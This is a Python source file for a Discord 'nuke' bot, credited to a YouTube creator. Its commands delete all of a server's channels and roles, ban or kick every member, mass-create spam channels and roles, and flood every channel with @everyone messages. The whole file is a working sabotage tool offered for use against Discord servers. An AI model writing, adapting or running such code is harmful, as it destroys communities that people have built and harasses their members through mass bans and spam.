import discord
import asyncio
from discord.ext import commands
import time
from random import randint

bot = commands.Bot(command_prefix = "!")

def convert_error(error):     #task=ban, spam, kick, nuke, combo, role <-- for writing error messages and error file
    try:
        with open("error_log.txt", "a") as log:    #appends to the current file or creates it if not found
            current_time = time.ctime() #get actual time
            log.write(str(current_time) + " : " + str(error) + "\n")   #actual logging, logs like TIME : ERROR
            
            error_type = type(error).__name__
            if error_type == "Forbidden":   #for user friendly real-time error message, return will be recieved and interpreted in function
                return "Forbidden"
            elif error_type == "NotFound":                              
                return "NotFound"
            elif error_type == "HTTPException":
                return "HTTPException"
            elif error_type == "TypeError":
                return "TypeError"
            else:
                return "UnknownError"
            
    except Exception as e:
        print("Couldn't create 'error_log.txt' because of the error:\n" + str(e))   #if the error log couldnt be created
    
@bot.event  #when the bot is ready, inform the user
async def on_ready():
    print("Ultimate Discord Nuke created by alphascript on youtube, check out the Commands Text file to see how the bot works! The file 'error_log.txt' will be created and any errors will be written to it.")

@bot.command()  #delete all the channels
async def nuke(ctx):                            
    try:   #delete all channels
        start_time = time.time()        #get the time at start
        channels = ctx.guild.channels   #get all channels initially
        for channel in channels:
            try:                        #allows bot to keep deleting
                await channel.delete()
                print("Channel: '" + channel.name + "' has been deleted.")
                
            except Exception as error:
                error = convert_error(error)    #get readable error
                print("Channel: '" + channel.name + "' couldn't be deleted. ERROR = " + error)          #deleting all channels
                
        await ctx.guild.create_text_channel("get nuked")    
        time_taken = time.time() - start_time   #figure out time since start
        print("Nuke completed in " + str(time_taken) + " seconds.")

    except Exception as error:
        error = convert_error(error)
        print("Nuke failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")

@bot.command()  #spam create channels
async def spam(ctx, num_of_channels="10", name="get spammed"):   #gets number of channels as args, default=10
    num_of_channels_created = 0
    num_of_channels_failed = 0 
    try:
        start_time = time.time()
        for i in range(int(num_of_channels)):
            try:
                await ctx.guild.create_text_channel(name)
                num_of_channels_created += 1
                print("Channel: " + str(i+1) + " has been successfully created.")  #show index number for actual position of channel rather than the number created
                
            except Exception as error:
                error = convert_error(error)
                print("Channel: " + str(i+1) + " couldn't be created. ERROR = " + error)
                num_of_channels_failed += 1

        time_taken = time.time() - start_time
        print(str(num_of_channels_created) + " channels created in " + str(time_taken) + " seconds, with the name: '" + name + "'.")
        print(str(num_of_channels_failed) + " channels failed to create.")
        
    except Exception as error:     #only way program can fail is because of number error hence this works
        error = convert_error(error)
        print("Spam failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")

@bot.command()
async def ban(ctx, target=None):
    try:
        start_time = time.time()
        num_of_members_banned = 0
        num_of_members_failed_to_ban = 0
        if target == None:
            members = ctx.guild.members
            for member in members:
                try:
                    await member.ban()
                    num_of_members_banned += 1
                    print("Member: '" + str(member) + "' has been banned.")
                    
                except Exception as error:
                    num_of_members_failed_to_ban += 1
                    error = convert_error(error)
                    print("Couldn't ban: '" + str(member) + "' ERROR = " + error)

            time_taken = time.time() - start_time
            print(str(num_of_members_banned) + " members banned in " + str(time_taken) + " seconds.")
            print(str(num_of_members_failed_to_ban) + " members failed to ban. Check the 'error_log.txt' for details.")

        else:
            try:
                start_time = time.time()
                member = ctx.guild.get_member_named(str(target))
                await member.ban()
                time_taken = time.time() - start_time
                print("Banned: '" + str(target) + "' in " + str(time_taken) + " seconds.")
                
            except Exception as error:
                error = convert_error(error)
                print("Couldn't find/ban: '" + str(target) + "' ERROR = " + error)
                
    except Exception as error:
        error = convert_error(error)
        print("Couldn't ban member/members. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")

@bot.command()
async def kick(ctx, target=None):       #copy of !ban but kick instead of ban
    try:
        start_time = time.time()
        num_of_members_kicked = 0
        num_of_members_failed_to_kick = 0
        if target == None:
            members = ctx.guild.members
            for member in members:
                try:
                    await member.kick()
                    print("Member: '" + str(member) + "' has been kicked.")
                    num_of_members_kicked += 1
                    
                except Exception as error:
                    error = convert_error(error)
                    print("Couldn't kick: '" + str(member) + "' ERROR = " + error)
                    num_of_members_failed_to_kick += 1

            time_taken = time.time() - start_time
            print(str(num_of_members_kicked) + " members kicked in " + str(time_taken) + " seconds.")
            print(str(num_of_members_failed_to_kick) + " members failed to kick. Check the 'error_log.txt' for details.")

        else:
            try:
                start_time = time.time()
                member = ctx.guild.get_member_named(str(target))
                await member.kick()
                time_taken = time.time() - start_time
                print("Kicked: '" + str(target) + "' in " + str(time_taken) + " seconds.")
                
            except Exception as error:
                error = convert_error(error)
                print("Couldn't find/kick: '" + str(target) + "' ERROR = " + error)
                
    except Exception as error:
        error = convert_error(error)
        print("Couldn't kick member/members. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
        

@bot.command()
async def droles(ctx):  #delete all roles
    try:
        start_time = time.time()
        roles_deleted = 0
        roles_failed_to_delete = 0
        roles = ctx.guild.roles
        for role in roles:
            try:
                await role.delete()
                print("Deleted role: " + str(role.name))
                roles_deleted += 1

            except Exception as error:
                error = convert_error(error)
                roles_failed_to_delete += 1
                print("Couldn't delete role: " + str(role.name) + " ERROR = " + error)

        time_taken = time.time() - start_time
        print(str(roles_deleted) + " roles deleted in " + str(time_taken) + " seconds.")
        print(str(roles_failed_to_delete) + " roles failed to delete, see 'error_log.txt' for details.")

    except Exception as error:
        error = convert_error(error)
        print("Couldn't delete roles. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")

@bot.command()  #spam create roles, clone of channel spam
async def sroles(ctx, num_of_roles="10", n="spam"):   #gets number of roles as args, default=10, name is "spam"
    num_of_roles_created = 0
    num_of_roles_failed = 0 
    try:
        start_time = time.time()
        for i in range(int(num_of_roles)):
            try:
                await ctx.guild.create_role(name=n)  #inputted name
                num_of_roles_created += 1
                print("Role: " + str(i+1) + " has been successfully created.")  #show index number for actual position of role rather than the number created
                
            except Exception as error:
                error = convert_error(error)
                print("Role: " + str(i+1) + " couldn't be created. ERROR = " + error)
                num_of_roles_failed += 1

        time_taken = time.time() - start_time
        print(str(num_of_roles_created) + " roles created in " + str(time_taken) + " seconds, with the name: '" + n + "'.")
        print(str(num_of_roles_failed) + " roles failed to create.")
        
    except Exception as error:     #only way program can fail is because of number error hence this works
        error = convert_error(error)
        print("Role spam failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
        
@bot.command()
async def alert(ctx, message="@everyone", time_alerting=10): #message must be in "" and message must be inputted
    try:
        start_time = time.time()
        channels = ctx.guild.channels
        times_sent = 0
        while time.time() - start_time < time_alerting:
            for channel in channels:
                try:
                    await channel.send(str(message))    
                    print("'" + message + "' sent to channel: '" + channel.name + "'.")
                    times_sent += 1
                except Exception as error:
                    print("Couldn't alert to channel: '" + channel.name + "' ERROR = " + str(error))

        print("'" + message + "' has been sent " + str(times_sent) + " times in " + str(time_alerting) + " seconds.")
                    
    except Exception as error:
        error = convert_error(error)
        print("Couldn't alert: '" + message + "' for " + str(time_alerting) + " seconds. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")

#try load the bot_token, if no file is found, create a new one.
try:
    with open("bot_token.txt", "r") as token_file:
        bot_token = token_file.read()
    bot.run(bot_token)
    
except:
    with open("bot_token.txt", "w") as token_file:
        print("'bot_token.txt' was not found or your bot's token was entered incorrectly, a new file has been created, please re-enter your bot's token.")

#so the program doesn't immediately quit
hold = input("Press enter to end the program.")
